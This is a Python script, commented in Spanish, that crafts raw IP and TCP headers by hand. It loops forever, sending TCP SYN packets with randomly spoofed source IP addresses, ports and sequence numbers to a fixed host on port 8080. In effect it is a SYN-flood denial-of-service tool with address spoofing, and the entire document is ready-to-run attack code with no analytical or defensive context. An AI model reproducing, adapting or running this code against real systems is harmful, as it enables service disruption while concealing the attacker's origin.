#!/usr/bin/python3
import socket
import struct
import random
import time

DEST_IP = "192.168.100.10"
DEST_PORT = 8080
PACKET_LEN = 1500

# Función para calcular la suma de verificación TCP
def calculate_tcp_checksum(src_ip, dest_ip, tcp_header, data):
    pseudo_header = struct.pack('!4s4sBBH',
                                socket.inet_aton(src_ip),
                                socket.inet_aton(dest_ip),
                                0, socket.IPPROTO_TCP, len(tcp_header))
    pseudo_header = pseudo_header + tcp_header
    if len(data) % 2 == 1:
        data += b'\x00'
    pseudo_header = pseudo_header + data
    checksum = 0
    for i in range(0, len(pseudo_header), 2):
        w = (pseudo_header[i] << 8) + (pseudo_header[i+1])
        checksum += w
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum = ~checksum & 0xFFFF
    return checksum

# Función para enviar un paquete IP crudo
def send_raw_ip_packet(ip_header):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.sendto(ip_header, (DEST_IP, 0))
    s.close()

# Función principal
def main():
    while True:
        # Generar un paquete TCP SYN aleatorio
        tcp_header = struct.pack('!HHIIBBHHH',
                                 random.randint(1024, 65535),  # Origen del puerto
                                 DEST_PORT,  # Puerto de destino
                                 random.randint(0, 4294967295),  # Número de secuencia
                                 0,  # Número de acuse
                                 (5 << 4),  # Offset de datos
                                 2,  # Flags (SYN)
                                 socket.htons(20000),  # Tamaño de la ventana
                                 0,  # Checksum (se calculará más tarde)
                                 0)  # Urgent Pointer

        # Calcular el checksum TCP
        src_ip = socket.inet_ntoa(struct.pack('>I', random.randint(0, 0xFFFFFFFF)))
        dest_ip = DEST_IP
        tcp_checksum = calculate_tcp_checksum(src_ip, dest_ip, tcp_header, b'')

        # Actualizar el campo de checksum en el encabezado TCP
        tcp_header = tcp_header[:16] + struct.pack('!H', tcp_checksum) + tcp_header[18:]

        # Construir el paquete IP
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                (4 << 4) | 5,  # Versión de IP y longitud del encabezado
                                0,  # Tipo de servicio
                                len(tcp_header) + 20,  # Longitud total
                                54321,  # Identificación
                                0,  # Flags y desplazamiento
                                50,  # Tiempo de vida
                                socket.IPPROTO_TCP,  # Protocolo (TCP)
                                0,  # Checksum (se calculará más tarde)
                                socket.inet_aton(src_ip),  # Dirección IP de origen
                                socket.inet_aton(dest_ip))  # Dirección IP de destino

        # Calcular el checksum IP
        ip_checksum = 0
        for i in range(0, len(ip_header), 2):
            w = (ip_header[i] << 8) + (ip_header[i+1])
            ip_checksum += w
        ip_checksum = (ip_checksum >> 16) + (ip_checksum & 0xFFFF)
        ip_checksum = ~ip_checksum & 0xFFFF

        # Actualizar el campo de checksum en el encabezado IP
        ip_header = ip_header[:10] + struct.pack('!H', ip_checksum) + ip_header[12:]

        # Enviar el paquete
        send_raw_ip_packet(ip_header + tcp_header)

        time.sleep(1)

if __name__ == "__main__":
    main()
